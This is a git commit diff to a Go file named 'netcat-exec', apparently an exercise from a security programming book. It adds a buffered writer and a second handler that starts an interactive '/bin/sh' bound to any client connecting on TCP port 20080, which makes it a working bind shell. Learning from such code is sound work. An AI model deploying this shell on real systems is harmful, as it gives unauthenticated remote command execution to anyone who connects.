088dedcfb939e3b1361dbf353f81b7aaa4b9b422
Nicolas Leigh <linze201@gmail.com>
2024-07-09 12:25:58 +0800

    add additional code to ch2

--- ch-2/netcat-exec/main.go
+++ ch-2/netcat-exec/main.go
@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"io"
 	"log"
 	"net"
@@ -24,6 +25,47 @@ func handle(conn net.Conn) {
 	cmd.Run()
 	conn.Close()
 }
+
+//*********** More verbose solution ***********
+// Flusher wraps bufio.Writer, explicitly flushing on all writes.
+type Flusher struct {
+	w *bufio.Writer
+}
+
+// NewFlusher creates a new Flusher from an io.Writer.
+func NewFlusher(w io.Writer) *Flusher {
+	return &Flusher{
+		w: bufio.NewWriter(w),
+	}
+}
+
+// Write writes bytes and explicitly flushes buffer.
+func (foo *Flusher) Write(b []byte) (int, error) {
+	count, err := foo.w.Write(b)
+	if err != nil {
+		return -1, err
+	}
+	if err := foo.w.Flush(); err != nil {
+		return -1, err
+	}
+	return count, err
+}
+
+func handle2(conn net.Conn) {
+	cmd := exec.Command("/bin/sh", "-i")
+
+	// Set stdin to our connection
+	cmd.Stdin = conn
+
+	// Create a Flusher from the connection to use for stdout.
+	// This ensures stdout is flushed adequately and send via net.Conn.
+	cmd.Stdout = NewFlusher(conn)
+
+	if err := cmd.Run(); err != nil {
+		log.Fatalln(err)
+	}
+}
+//************************
 
 func main() {
 	listener, err := net.Listen("tcp", ":20080")
